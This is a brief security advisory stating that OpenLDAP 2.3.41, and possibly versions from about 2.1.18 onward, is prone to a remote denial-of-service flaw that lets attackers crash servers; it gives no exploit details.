OpenLDAP is prone to a remote denial-of-service vulnerability.

Attackers can exploit this issue to deny service to legitimate users by crashing affected servers.

OpenLDAP 2.3.41 is vulnerable to this issue; earlier versions back to approximately 2.1.18 as well as newer versions may also be affected.
